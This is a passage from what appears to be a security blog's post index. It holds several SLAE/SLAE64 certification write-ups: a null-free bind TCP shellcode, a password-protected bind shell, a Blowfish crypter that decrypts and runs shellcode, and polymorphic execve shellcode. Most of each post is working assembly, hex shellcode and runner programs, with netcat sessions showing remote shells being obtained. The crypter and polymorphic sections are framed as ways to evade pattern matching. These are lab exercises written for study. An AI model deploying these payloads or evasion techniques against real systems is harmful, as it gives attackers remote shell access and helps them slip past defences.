f: ba 00 00 00 00 mov edx,0x0 14: 0f 05 syscall 16: 48 89 c7 mov rdi,rax 19: 48 31 c0 xor rax,rax 1c: 50 push rax 1d: 89 44 24 fc mov DWORD PTR [rsp-0x4],eax 21: 66 c7 44 24 fa 11 5c mov WORD PTR [rsp-0x6],0x5c11 28: 66 c7 44 24 f8 02 00 mov WORD PTR [rsp-0x8],0x2 2f: 48 83 ec 08 sub rsp,0x8 33: b8 31 00 00 00 mov eax,0x31 38: 48 89 e6 mov rsi,rsp 3b: ba 10 00 00 00 mov edx,0x10 40: 0f 05 syscall 42: b8 32 00 00 00 mov eax,0x32 47: be 02 00 00 00 mov esi,0x2 4c: 0f 05 syscall 4e: b8 2b 00 00 00 mov eax,0x2b 53: 48 83 ec 10 sub rsp,0x10 57: 48 89 e6 mov rsi,rsp 5a: c6 44 24 ff 10 mov BYTE PTR [rsp-0x1],0x10 5f: 48 83 ec 01 sub rsp,0x1 63: 48 89 e2 mov rdx,rsp 66: 0f 05 syscall 68: 49 89 c1 mov r9,rax 6b: b8 03 00 00 00 mov eax,0x3 70: 0f 05 syscall 72: 4c 89 cf mov rdi,r9 75: b8 21 00 00 00 mov eax,0x21 7a: be 00 00 00 00 mov esi,0x0 7f: 0f 05 syscall 81: b8 21 00 00 00 mov eax,0x21 86: be 01 00 00 00 mov esi,0x1 8b: 0f 05 syscall 8d: b8 21 00 00 00 mov eax,0x21 92: be 02 00 00 00 mov esi,0x2 97: 0f 05 syscall 99: 48 31 c0 xor rax,rax 9c: 50 push rax 9d: 48 bb 2f 62 69 6e 2f movabs rbx,0x68732f2f6e69622f a4: 2f 73 68 a7: 53 push rbx a8: 48 89 e7 mov rdi,rsp ab: 50 push rax ac: 48 89 e2 mov rdx,rsp af: 57 push rdi b0: 48 89 e6 mov rsi,rsp b3: 48 83 c0 3b add rax,0x3b b7: 0f 05 syscallIt seems as this assembly program has a great quantity of null opcodes. Nonetheless, if we pay close attention, we might notice that most of these come from mov instructions. For instance, when a single byte such as 1 is being inserted into a 64-bit register such as RAX, a lot of nulls will be parsed as well. This could easily be circumvented by pushing such bytes as WORDs and then saving such values in Lower 16 bit registers such as ax, bx, dx, bp, and so forth.Other techniques could simply implement using a lower bit register such as lower 8-bits instead of 64-bits when it comes to small operations.Final code:global _start_start: ; sock = socket(AF_INET, SOCK_STREAM, 0) ; AF_INET = 2 ; SOCK_STREAM = 1 ; syscall number 41 xor rax, rax xor rdi, rdi xor rsi, rsi mov al, 41 inc rdi inc rdi inc rsi xor rdx, rdx syscall ; copy socket descriptor to rdi for future use mov rdi, rax ; server.sin_family = AF_INET ; server.sin_port = htons(PORT) ; server.sin_addr.s_addr = INADDR_ANY ; bzero(&amp;server.sin_zero, 8) xor rax, rax push rax xor rbp, rbp push word 2 pop bp mov dword [rsp-4], eax mov word [rsp-6], 0x5c11 mov word [rsp-8], bp sub rsp, 8 ; bind(sock, (struct sockaddr *)&amp;server, sockaddr_len) ; syscall number 49 mov al, 49 mov rsi, rsp mov dl, 16 syscall ; listen(sock, MAX_CLIENTS) ; syscall number 50 push word 2 pop bp mov al, 50 mov rsi, rbp syscall ; new = accept(sock, (struct sockaddr *)&amp;client, &amp;sockaddr_len) ; syscall number 43 mov al, 43 sub rsp, 16 mov rsi, rsp mov byte [rsp-1], 16 sub rsp, 1 mov rdx, rsp syscall ; store the client socket description mov r9, rax ; close parent mov al, 3 syscall ; duplicate sockets ; dup2 (new, old) mov rdi, r9 mov al, 33 xor rsi, rsi syscall mov al, 33 push word 1 pop bp mov rsi, rbp syscall mov al, 33 push word 2 pop bp mov rsi, rbp syscall ; execve ; First NULL push xor rax, rax push rax ; push /bin//sh in reverse mov rbx, 0x68732f2f6e69622f push rbx ; store /bin//sh address in RDI mov rdi, rsp ; Second NULL push push rax ; set RDX mov rdx, rsp ; Push address of /bin//sh push rdi ; set RSI mov rsi, rsp ; Call the Execve syscall add rax, 59 syscallLet’s assemble, link this and get its shellcode!whitecr0wz@SLAE64:~/assembly/assignments/Assignment_1/B$ nasm -f elf64 1.asm -o 1.o &amp;&amp; ld 1.o -o 1 &amp;&amp; for i in $(objdump -d 1 -M intel |grep \"^ \" |cut -f2); do echo -n '\\x'$i; done;echoC format:#include &lt;stdio.h&gt;#include &lt;string.h&gt;unsigned char code[] = \\\"\\x48\\x31\\xc0\\x48\\x31\\xff\\x48\\x31\\xf6\\xb0\\x29\\x48\\xff\\xc7\\x48\\xff\\xc7\\x48\\xff\\xc6\\x48\\x31\\xd2\\x0f\\x05\\x48\\x89\\xc7\\x48\\x31\\xc0\\x50\\x48\\x31\\xed\\x66\\x6a\\x02\\x66\\x5d\\x89\\x44\\x24\\xfc\\x66\\xc7\\x44\\x24\\xfa\\x11\\x5c\\x66\\x89\\x6c\\x24\\xf8\\x48\\x83\\xec\\x08\\xb0\\x31\\x48\\x89\\xe6\\xb2\\x10\\x0f\\x05\\x66\\x6a\\x02\\x66\\x5d\\xb0\\x32\\x48\\x89\\xee\\x0f\\x05\\xb0\\x2b\\x48\\x83\\xec\\x10\\x48\\x89\\xe6\\xc6\\x44\\x24\\xff\\x10\\x48\\x83\\xec\\x01\\x48\\x89\\xe2\\x0f\\x05\\x49\\x89\\xc1\\xb0\\x03\\x0f\\x05\\x4c\\x89\\xcf\\xb0\\x21\\x48\\x31\\xf6\\x0f\\x05\\xb0\\x21\\x66\\x6a\\x01\\x66\\x5d\\x48\\x89\\xee\\x0f\\x05\\xb0\\x21\\x66\\x6a\\x02\\x66\\x5d\\x48\\x89\\xee\\x0f\\x05\\x48\\x31\\xc0\\x50\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x53\\x48\\x89\\xe7\\x50\\x48\\x89\\xe2\\x57\\x48\\x89\\xe6\\x48\\x83\\xc0\\x3b\\x0f\\x05\";main(){ printf(\"Shellcode Length: %d\\n\", (int)strlen(code)); int (*ret)() = (int(*)())code; ret(); }EndGamewhitecr0wz@SLAE64:~/assembly/assignments/Assignment_1/B$ gcc null-free.c -o null-free -fno-stack-protector -z execstack -w whitecr0wz@SLAE64:~/assembly/assignments/Assignment_1/B$ ./null-free Shellcode Length: 177─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────root@whitecr0wz:~# rlwrap nc 192.168.100.205 4444 -v 192.168.100.205: inverse host lookup failed: Unknown host(UNKNOWN) [192.168.100.205] 4444 (?) openpython3 -c 'import pty;pty.spawn(\"/bin/bash\")'whitecr0wz@SLAE64:/home/whitecr0wz/assembly/assignments/Assignment_1/B$ id id uid=1000(whitecr0wz) gid=1000(whitecr0wz) groups=1000(whitecr0wz),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth)whitecr0wz@SLAE64:/home/whitecr0wz/assembly/assignments/Assignment_1/B$ CodeThis blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification: http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/Student ID: SLAE64–27812/PA-27812You can find all of the used resources within this post here." }, { "title": "SLAE64 - Assignment 1A - Password-Protected Bind TCP Shellcode", "url": "/posts/SLAE64-Bind-Password/", "categories": "SLAE64", "tags": "assembly, shellcoding", "date": "2021-01-20 05:44:00 +0000", "snippet": "IntroductionThese series of posts starting with the prefix “SLAE64 - Assignment” will be created in order to fulfill the requirements of the SLAE64 certification. Today we are going to have a close look at Linux Bind Shells with password protection.A Bind shell is a form of malware which grants remote access to a system through a shell. However, it differentiates from its peer the Reverse Shell, binding to a local port of the compromised system, instead of arranging a specific connection on a trivial address. Furthermore, after the connection is established, a shell is executed, granting interaction to the attackerThe first assignment from the seven is divided in two sections: A: Requires the creation of a Bind Shell with password protection through the Assembly language, and converting such into shellcode. B: The discussed Bind Shell provided during the course should be modified, in order that it no longer possesses any form of NULL bytes (00).As exercise A is already quite a complex and long exercise, the first assignment will be segmented in two different posts, thing which may repeat within the second assignment. During the length of this post, you will observe the solution for exercise A.Moreover, the main idea of a Bind Shell and process of programming such has already been explored here. Therefore, I thought of focusing the blog’s topic on the new addition regarding the password protection instead, which is by itself rather complex.TheoryIf you remember the x86 version of this assignment, you’d remember that the required functions for a Bind Shell are the following: Socket Bind Listen Accept Dup2 Execve After the dup2 syscall has been satisfied and executed, the connection should already possess the ability to interact with the other gadget. Therefore, we could send a message and receive information from the other device. The process will be the following: Socket Bind Listen Accept Dup2 Function that is only executed if the comparison ends up not matching. (write failure message) Function that asks for the passcode (write). After the dup2 syscall is initialized, a JMP will be set so that the flow directly continues to this function. Function that reads the input (read). Function that compares the input with the intended passcode. If they do not match, jump to the failure function. Execve Time to stick our hands into the mudLet’s start with the failure function, right after dup2.The process should be the following.Arguments required for write according to the man page: ssize_t write(int fd, const void *buf, size_t count); It is required to call the write syscall. This will be arranged by incrementing the value of AL by 1. RDI will be incremented as well, as this will give RDI the STDOUT value, printing to the screen. RSI will hold temporarely and push the value to print to the screen. RSI will then copy the value from RSP. DL will be given the length of the entire string. This should write “Incorrect credentials. “ into the client’s screen. jmp question ; Jump to the \"question\" function.halt: xor rax, rax ; Zeroes out RAX. xor rdi, rdi ; Zeroes out RDI. xor rsi, rsi ; Zeroes out RSI. xor rdx, rdx ; Zeroes out RDX. push rdi ; Pushes the NULL DWORD (0x00000000) of RDI into the stack. pop rbp ; Pops the NULL DWORD in RBP. push rbp ; Pushes the NULL DWORD (0x00000000) of RBP into the stack. Without this combination of PUSH/POP instructions the printed characters would have an ; additional character that isn't needed (I.E an - or &lt;) inc al ; Increments AL, giving the value 1 for the syscall write. inc rdi ; Increments RDI, giving the value of 1, arranging STDOUT, printing the message on the screen. add si, ' ' ; Blank space. push rsi ; Pushes the value of RSI into the stack. xor rsi, rsi ; Zeroes out RSI. mov rsi, 'entials.' ; Inserts value 'entials.' into RSI push rsi ; Pushes the value of RSI into the stack. xor rsi, rsi ; Zeroes out RSI. add rsi, 'cred' ; Inserts value 'cred' into RSI push rsi ; Pushes the value of RSI into the stack. xor rsi, rsi ; Zeroes out RSI. add si, 't ' ; Inserts value 't ' into SI push rsi ; Pushes the value of RSI into the stack. mov rsi, 'Incorrec' ; Inserts value 'Incorrec' into RSI push rsi ; Pushes the value of RSI into the stack. mov rsi, rsp ; Copies the value of RSP into RSI. The complete phrase should be \"Incorrect credentials. \" mov dl, 34 ; Gives DL the length of the entire string, which should be around 34. If DL is given a bigger value than the real one (I.E 50), the password will ; be printed when this message pops up. syscall ; The syscall is executed.Great, the failure function has already been set, let us continue with the function “question”.The process should be incredibly similar to the failure function, as the main point of both is to write to the screen:Arguments required for write according to the man page: ssize_t write(int fd, const void *buf, size_t count); It is required to call the write syscall. This will be arranged by incrementing the value of AL by 1. RDI will be incremented as well, as this will give RDI the STDOUT value, printing to the screen. RSI will hold temporarely and push the value to print to the screen. RSI will then copy the value from RSP. DL will be given the length of the entire string. This should write “Introduce your password:” into the client’s screen.question: xor rax, rax ; Zeroes out RAX xor rdi, rdi ; Zeroes out RDI xor rsi, rsi ; Zeroes out RSI xor rdx, rdx ; Zeroes out RDX push rdi ; Pushes the NULL DWORD (0x00000000) of RDI into the stack. pop rbp ; Pops the NULL DWORD in RBP. push rbp ; Pushes the NULL DWORD (0x00000000) of RBP into the stack. Without this combination of PUSH/POP instructions the printed characters would have an ; additional character that isn't needed (I.E an - or &lt;). inc al ; Increments AL, giving the value 1 for the syscall write. inc rdi ; Increments RDI, giving the value of 1, arranging STDOUT, printing the message on the screen. mov rsi, 'assword:' ; Inserts value 'assword:' into RSI. push rsi ; Pushes the value of RSI into the stack. mov rsi, 'e your p' ; Inserts value 'e your p' into RSI. push rsi ; Pushes the value of RSI into the stack. mov rsi, 'Introduc' ; Inserts value 'Introduc' into RSI. push rsi ; Pushes the value of RSI into the stack. mov rsi, rsp ; Copies the value of RSP into RSI. The complete phrase should be \"Introduce your password:\" mov dl, 28 ; Gives DL the length of the entire string, which should be around 28. If DL is given a bigger value than the real one (I.E 50), the string will ; be printed several times and lack certain characters. syscall ; The syscall is executed.We can now proceed with the read function, which will obtain the input.The process should be the following:Arguments required for write according to the man page: ssize_t read(int fd, void *buf, size_t count); The value of RAX is set to 0, as it is the value for the read syscall. The value of RDI is quite irrelevant, therefore, it is zeroed as well. RSI is inserted the value of RSP. DL is given the quantity of bytes to read. Nonetheless, as long as the quantity is as big as the input, anything goes!read: xor rax, rax ; Zeroes out RAX. xor rdi, rdi ; Zeroes out RDI. xor rdx, rdx ; Zeroes out RDX. push rdx ; Pushes the NULL DWORD (0x00000000) of RDX into the stack. pop rbp ; Pops the NULL DWORD in RBP. push rbp ; Pushes the NULL DWORD (0x00000000) of RBP into the stack. Without this combination of PUSH/POP instructions the printed characters would have an ; additional character that isn't needed (I.E an - or &lt;). mov rsi, rsp ; Copies the value of RSP into RSI. mov dl, 30 ; Gives DL the quantity of bytes to read, anything beyond intended should work as well. syscall ; The syscall is executed.Finally, we are left with the comparison, this is where the fun begins. The process should follows a very specific procedure: RDI is given the value of RSP. In other words, RDI should hold the value of the input. RSI is used in order to save the password to compare with. RCX will be used as a counter. The instructions repe cmpsb, in simple terms, will compare every byte of RDI with RSI, as long as these match, the Zero flag (ZF) will be set. Furthermore, if all 16 bytes are the same, the ZF will remain deployed. If the ZF has not been set after the repe cmpsb operations, it means that the input was incorrect, therefore, a JNZ jump has been set pointing towards the halt function, giving the failure message and repeating the loop.comparison: ; Password: WjbkN3yQRpKVEFbA mov rdi, rsp ; Copies the value of RSP into RSI. This will copy what was read on the previous function. xor rax, rax ; Zeroes out RAX. xor rsi, rsi ; Zeroes out RSI. xor rdx, rdx ; Zeroes out RDX. mov rsi, 'RpKVEFbA' ; Inserts value 'RpKVEFbA' into RSI. push rsi ; Pushes the value of RSI into the stack. mov rsi, 'WjbkN3yQ' ; Inserts value 'WjbkN3yQ' into RSI. push rsi ; Pushes the value of RSI into the stack. mov rsi, rsp ; Copies the value of RSP into RSI. xor rcx, rcx ; Zeroes out RCX mov cl, 16 ; Gives CL a value of 16. This value should remain the same length as the password (WjbkN3yQRpKVEFbA), as this value will be crucial for ; comparison. ; If given less, the complete password isn't needed. If given more, the credential will not work even if sent correctly. repe cmpsb ; Will compare the strings and check if such match. If they do, it sets the Zero flag (ZF). jnz halt ; Jump if the as long as the Zero flag (ZF) is not set, this means that if the password is incorrect, it should redirect the flow to the error ; message.Final CodeThe full code can be found hereShellcodewhitecr0wz@SLAE64:~/assembly/assignments/Assignment_1$ nasm -f elf64 1.asm -o 1.o &amp;&amp; ld 1.o -o 1 &amp;&amp; for i in $(objdump -d 1 -M intel |grep \"^ \" |cut -f2); do echo -n '\\x'$i; done;echo \\x48\\x31\\xc0\\x48\\x31\\xff\\x48\\x31\\xf6\\x48\\x31\\xd2\\x66\\x6a\\x29\\x66\\x58\\x48\\xff\\xc7\\x48\\xff\\xc7\\x48\\xff\\xc6\\x52\\x0f\\x05\\x48\\x89\\xc3\\x66\\x6a\\x31\\x66\\x58\\x48\\x89\\xdf\\x52\\x52\\x66\\x68\\x23\\x28\\x66\\x6a\\x02\\x48\\x89\\xe6\\xb2\\x1e\\x0f\\x05\\x66\\x6a\\x32\\x66\\x58\\x48\\x89\\xdf\\x48\\x31\\xf6\\x0f\\x05\\x66\\x6a\\x2b\\x66\\x58\\x48\\x89\\xdf\\x48\\x31\\xf6\\x48\\x31\\xd2\\x0f\\x05\\x48\\x89\\xc5\\x48\\xff\\xc6\\x48\\xff\\xc6\\x48\\xff\\xc6\\x66\\x6a\\x21\\x66\\x58\\x48\\x89\\xef\\x48\\xff\\xce\\x0f\\x05\\x75\\xf1\\xeb\\x4d\\x48\\x31\\xc0\\x48\\x31\\xff\\x48\\x31\\xf6\\x48\\x31\\xd2\\x57\\x5d\\x55\\xfe\\xc0\\x48\\xff\\xc7\\x66\\x83\\xc6\\x20\\x56\\x48\\x31\\xf6\\x48\\xbe\\x65\\x6e\\x74\\x69\\x61\\x6c\\x73\\x2e\\x56\\x48\\x31\\xf6\\x48\\x81\\xc6\\x63\\x72\\x65\\x64\\x56\\x48\\x31\\xf6\\x66\\x81\\xc6\\x74\\x20\\x56\\x48\\xbe\\x49\\x6e\\x63\\x6f\\x72\\x72\\x65\\x63\\x56\\x48\\x89\\xe6\\xb2\\x22\\x0f\\x05\\x48\\x31\\xc0\\x48\\x31\\xff\\x48\\x31\\xf6\\x48\\x31\\xd2\\x57\\x5d\\x55\\xfe\\xc0\\x48\\xff\\xc7\\x48\\xbe\\x61\\x73\\x73\\x77\\x6f\\x72\\x64\\x3a\\x56\\x48\\xbe\\x65\\x20\\x79\\x6f\\x75\\x72\\x20\\x70\\x56\\x48\\xbe\\x49\\x6e\\x74\\x72\\x6f\\x64\\x75\\x63\\x56\\x48\\x89\\xe6\\xb2\\x1c\\x0f\\x05\\x48\\x31\\xc0\\x48\\x31\\xff\\x48\\x31\\xd2\\x52\\x5d\\x55\\x48\\x89\\xe6\\xb2\\x1e\\x0f\\x05\\x48\\x89\\xe7\\x48\\x31\\xc0\\x48\\x31\\xf6\\x48\\x31\\xd2\\x48\\xbe\\x52\\x70\\x4b\\x56\\x45\\x46\\x62\\x41\\x56\\x48\\xbe\\x57\\x6a\\x62\\x6b\\x4e\\x33\\x79\\x51\\x56\\x48\\x89\\xe6\\x48\\x31\\xc9\\xb1\\x10\\xf3\\xa6\\x0f\\x85\\x32\\xff\\xff\\xff\\x48\\x31\\xc0\\x50\\x48\\xbb\\x2f\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x53\\x48\\x89\\xe7\\x50\\x48\\x89\\xe2\\x57\\x48\\x89\\xe6\\x66\\x6a\\x3b\\x66\\x58\\x0f\\x05whitecr0wz@SLAE64:~/assembly/assignments/Assignment_1$Let’s execute this within the C format:#include &lt;stdio.h&gt;#include &lt;string.h&gt;unsigned char code[] = \\\"\\x48\\x31\\xc0\\x48\\x31\\xff\\x48\\x31\\xf6\\x48\\x31\\xd2\\x66\\x6a\\x29\\x66\\x58\\x48\\xff\\xc7\\x48\\xff\\xc7\\x48\\xff\\xc6\\x52\\x0f\\x05\\x48\\x89\\xc3\\x66\\x6a\\x31\\x66\\x58\\x48\\x89\\xdf\\x52\\x52\\x66\\x68\\x23\\x28\\x66\\x6a\\x02\\x48\\x89\\xe6\\xb2\\x1e\\x0f\\x05\\x66\\x6a\\x32\\x66\\x58\\x48\\x89\\xdf\\x48\\x31\\xf6\\x0f\\x05\\x66\\x6a\\x2b\\x66\\x58\\x48\\x89\\xdf\\x48\\x31\\xf6\\x48\\x31\\xd2\\x0f\\x05\\x48\\x89\\xc5\\x48\\xff\\xc6\\x48\\xff\\xc6\\x48\\xff\\xc6\\x66\\x6a\\x21\\x66\\x58\\x48\\x89\\xef\\x48\\xff\\xce\\x0f\\x05\\x75\\xf1\\xeb\\x4d\\x48\\x31\\xc0\\x48\\x31\\xff\\x48\\x31\\xf6\\x48\\x31\\xd2\\x57\\x5d\\x55\\xfe\\xc0\\x48\\xff\\xc7\\x66\\x83\\xc6\\x20\\x56\\x48\\x31\\xf6\\x48\\xbe\\x65\\x6e\\x74\\x69\\x61\\x6c\\x73\\x2e\\x56\\x48\\x31\\xf6\\x48\\x81\\xc6\\x63\\x72\\x65\\x64\\x56\\x48\\x31\\xf6\\x66\\x81\\xc6\\x74\\x20\\x56\\x48\\xbe\\x49\\x6e\\x63\\x6f\\x72\\x72\\x65\\x63\\x56\\x48\\x89\\xe6\\xb2\\x22\\x0f\\x05\\x48\\x31\\xc0\\x48\\x31\\xff\\x48\\x31\\xf6\\x48\\x31\\xd2\\x57\\x5d\\x55\\xfe\\xc0\\x48\\xff\\xc7\\x48\\xbe\\x61\\x73\\x73\\x77\\x6f\\x72\\x64\\x3a\\x56\\x48\\xbe\\x65\\x20\\x79\\x6f\\x75\\x72\\x20\\x70\\x56\\x48\\xbe\\x49\\x6e\\x74\\x72\\x6f\\x64\\x75\\x63\\x56\\x48\\x89\\xe6\\xb2\\x1c\\x0f\\x05\\x48\\x31\\xc0\\x48\\x31\\xd2\\x52\\x5d\\x55\\x48\\x89\\xe6\\xb2\\x1e\\x0f\\x05\\x48\\x89\\xe7\\x48\\x31\\xc0\\x48\\x31\\xf6\\x48\\x31\\xd2\\x48\\xbe\\x52\\x70\\x4b\\x56\\x45\\x46\\x62\\x41\\x56\\x48\\xbe\\x57\\x6a\\x62\\x6b\\x4e\\x33\\x79\\x51\\x56\\x48\\x89\\xe6\\x48\\x31\\xc9\\xb1\\x10\\xf3\\xa6\\x0f\\x85\\x35\\xff\\xff\\xff\\x48\\x31\\xc0\\x50\\x48\\xbb\\x2f\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x53\\x48\\x89\\xe7\\x50\\x48\\x89\\xe2\\x57\\x48\\x89\\xe6\\x66\\x6a\\x3b\\x66\\x58\\x0f\\x05\";main(){ printf(\"Shellcode Length: %d\\n\", strlen(code)); int (*ret)() = (int(*)())code; ret();}EndGamewhitecr0wz@SLAE64:~/assembly/assignments/Assignment_1$ gcc bind_password.c -o bind_password -fno-stack-protector -z execstack -w whitecr0wz@SLAE64:~/assembly/assignments/Assignment_1$ ./bind_password Shellcode Length: 353─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────root@whitecr0wz:~# rlwrap nc 192.168.100.205 9000 -v 192.168.100.205: inverse host lookup failed: Unknown host(UNKNOWN) [192.168.100.205] 9000 (?) openIntroduce your password:passwordIncorrect credentials. Introduce your password:WjbkN3yQRpKVEFbAFpython3 -c 'import pty;pty.spawn(\"/bin/bash\")'whitecr0wz@SLAE64:/home/whitecr0wz/assembly/assignments/Assignment_1$ id id uid=1000(whitecr0wz) gid=1000(whitecr0wz) groups=1000(whitecr0wz),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth)whitecr0wz@SLAE64:/home/whitecr0wz/assembly/assignments/Assignment_1$CodeThis blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification: http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/Student ID: SLAE64–27812/PA-27812You can find all of the used resources within this post here." }, { "title": "SLAE - Assignment 7 - Custom Crypter", "url": "/posts/SLAE-Custom-Crypter/", "categories": "SLAE", "tags": "assembly, shellcoding", "date": "2021-01-19 05:44:00 +0000", "snippet": "IntroductionThese series of posts starting with the prefix “Assignment” will be created in order to fulfill the requirements of the SLAE certification.According to wikipedia, “In cryptography, encryption is the process of encoding information. This process converts the original representation of the information, known as plaintext, into an alternative form known as ciphertext. Ideally, only authorized parties can decipher a ciphertext back to plaintext and access the original information. Encryption does not itself prevent interference but denies the intelligible content to a would-be interceptor.”Today we are going to dive a little deep within Custom Encryption.The last assignment from the seven requires the creation of a Custom Encrypter, written in any language that can encrypt and decrypt shellcode. In addition, the decrypter should execute the shellcode.TheoryDuring the length of this post, the crypter used will be Blowfish. Moreover, the language employed will be Python, with the use of the library pycryptoEncrypter# Author: SLAE-27812 (Felipe Winsnes)from Crypto.Cipher import Blowfishimport sysif len(sys.argv) != 3: print \"[*] Example: echo -ne &lt;shellcode between quotes&gt; | python encrypt.py &lt;key&gt; &lt;IV number&gt;\" + \"\\r\\n\" sys.exit(1)obj = Blowfish.new(sys.argv[1], Blowfish.MODE_CBC, sys.argv[2])message = sys.stdin.read()ciphertext = obj.encrypt(message)crypted = \"\"for x in bytearray(ciphertext): crypted += '\\\\x' ciphertext = '%02x' % x crypted += ciphertextprint '\"' + crypted + '\"'As you can see, the shellcode must be printed and piped as an argument. Furthermore, the key and the IV must be parsed as arguments as well. In addition, the IV number should be specifically 8, as IV takes an 8 byte binary argument in such cryption schema.Let’s encode some execve shellcode that executes /bin/sh. The key will be ‘@-YEYCoy#86s+qXIngZwHe8X8tl4-59ADmJQ’ and the IV ‘ZYf3J4hM’. Furthermore, it is essential to note that the shellcode has to be divisible by 8. Due to this, the chosen shellcode has been parsed with a few nops. The original size was 22, it should be now 24.whitecr0wz@SLAE:~/assembly/assignments/Assignment_7$ python encrypt.py [*] Example: echo -ne &lt;shellcode between quotes&gt; | python encrypt.py &lt;key&gt; &lt;IV number&gt;whitecr0wz@SLAE:~/assembly/assignments/Assignment_7$ whitecr0wz@SLAE:~/assembly/assignments/Assignment_7$ echo -ne \"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x89\\xe2\\xb0\\x0b\\xcd\\x80\\x90\\x90\" | python encrypt.py @-YEYCoy#86s+qXIngZwHe8X8tl4-59ADmJQ ZYf3J4hM \"\\x24\\x5c\\xc5\\x8c\\x39\\x23\\x01\\x95\\xfd\\x4c\\x76\\x81\\x92\\xb4\\x97\\x18\\x94\\xb7\\xf1\\x4e\\x7e\\xb2\\xd3\\x42\"whitecr0wz@SLAE:~/assembly/assignments/Assignment_7$With no NOPS, the following error is given:whitecr0wz@SLAE:~/assembly/assignments/Assignment_7$ echo -ne \"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x89\\xe2\\xb0\\x0b\\xcd\\x80\" | python encrypt.py @-YEYCoy#86s+qXIngZwHe8X8tl4-59ADmJQ ZYf3J4hM Traceback (most recent call last): File \"encrypt.py\", line 15, in &lt;module&gt; ciphertext = obj.encrypt(message) File \"/usr/lib/python2.7/dist-packages/Crypto/Cipher/blockalgo.py\", line 244, in encrypt return self._cipher.encrypt(plaintext)ValueError: Input strings must be a multiple of 8 in lengthwhitecr0wz@SLAE:~/assembly/assignments/Assignment_7$Decrypter# Author: SLAE-27812 (Felipe Winsnes)from ctypes import *from Crypto.Cipher import Blowfishimport sysif len(sys.argv) != 3: print \"[*] Example: python decrypt.py &lt;key&gt; &lt;IV number&gt;\" + \"\\r\\n\" sys.exit(1)decrypted = \"\"ciphertext = (\"\\x24\\x5c\\xc5\\x8c\\x39\\x23\\x01\\x95\\xfd\\x4c\\x76\\x81\\x92\\xb4\\x97\\x18\\x94\\xb7\\xf1\\x4e\\x7e\\xb2\\xd3\\x42\")obj = Blowfish.new(sys.argv[1], Blowfish.MODE_CBC, sys.argv[2])decrypt = obj.decrypt(ciphertext)shellcode = decryptprint \"Original shellcode in hex escape sequence:\"for x in bytearray(decrypt): decrypted += '\\\\x' decrypt = '%02x' % x decrypted += decryptprint '\"' + (decrypted) + '\"'buffer = create_string_buffer(shellcode)print \" \"boom = cast(buffer, CFUNCTYPE(c_void_p))boom()EndGamewhitecr0wz@SLAE:~/assignments/Assignment_7$ python decrypt.py [*] Example: python decrypt.py &lt;key&gt; &lt;IV number&gt;whitecr0wz@SLAE:~/assignments/Assignment_7$ python decrypt.py @-YEYCoy#86s+qXIngZwHe8X8tl4-59ADmJQ ZYf3J4hM Original shellcode in hex escape sequence:\"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x89\\xe2\\xb0\\x0b\\xcd\\x80\\x90\\x90\" $CodeThis blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification: http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/Student ID: SLAE-27812/PA-27812You can find all of the used resources within this post here." }, { "title": "SLAE - Assignment 6 - Polymorphic Shellcode", "url": "/posts/SLAE-Polymorphic/", "categories": "SLAE", "tags": "assembly, shellcoding", "date": "2021-01-19 05:44:00 +0000", "snippet": "IntroductionThese series of posts starting with the prefix “Assignment” will be created in order to fulfill the requirements of the SLAE certification.According to wikipedia, “Polymorphic code is code that uses a polymorphic engine to mutate while keeping the original algorithm intact. That is, the code changes itself each time it runs, but the function of the code (its semantics) will not change at all. For example, 1+3 and 6-2 both achieve the same result while using different values and operations.”. This could include as well garbage instructions which do not affect execution at all. Nevertheless, it helps to beat pattern matching.Today we are going to dive a little deep within Polymorphic shellcode. However, instead of using an engine, we will generate it with our own hands!The sixth assignment from the seven requires taking three shellcodes from shell-storm.org and generate polymorphic versions of such. In addition, its size should not be bigger than 50%.Execve Shellcode (Shellcode #1)The first shellcode from the three will be one that executes /bin/sh through the execve syscall. It can be found here.Original codexor eax,eaxpush eaxpush 0x68732f2fpush 0x6e69622fmov ebx,esppush eaxpush ebxmov ecx,espmov al,0xbint 0x80There are infinite ways to modify such shellcode. For instance, “NOP equivalents” could be used, which add no functionality whatsoever and difficult pattern matching. Furthermore, the value /bin/sh that is pushed within the instructions push 0x68732f2f and push 0x6e69622f could be reduced by 1 and then incremented while being saved on a specific registers instead of directly the stack.Final code:global _start_start: sahf ; Should store instructions. However, it is used as a NOP equivalent. xor eax,eax ; Zeroes out EAX. pushad ; Should save the current flags. However, it is used as a NOP equivalent. push eax ; Pushes the dword of EAX (0x00000000). cld ; Should clear the direction flag. However, it is used as a NOP equivalent. mov esi, 0x68732f2e ; Saves value \"hs/.\". If incremented by 1, it should possess value \"hs//\". inc esi ; Increments ESI. cdq ; Zeroes out EDX. Also a NOP Equivalent. mov edi, 0x6e69622e ; Saves value \"nib.\". If incremented by 1, it should possess value \"bin/\". inc edi ; Increments EDI. push esi ; Pushes the value of ESI (\"hs//\"). std ; NOP Equivalent. push edi ; Pushes the value of EDI (\"bin/\"). mov ebx, esp ; Saves the value of ESP in EBX. cld ; NOP Equivalent. cmc ; NOP Equivalent. mov al, 11 ; Calls execve. int 0x80 ; Calls to kernel.Let’s dump the shellcode and test it!root@SLAE:/home/whitecr0wz/assembly/assignments/Assignment_6/1_shellcode# nasm -f elf32 1.asm -o 1.o &amp;&amp; ld 1.o -o 1 root@SLAE:/home/whitecr0wz/assembly/assignments/Assignment_6/1_shellcode# objdump -d ./1|grep 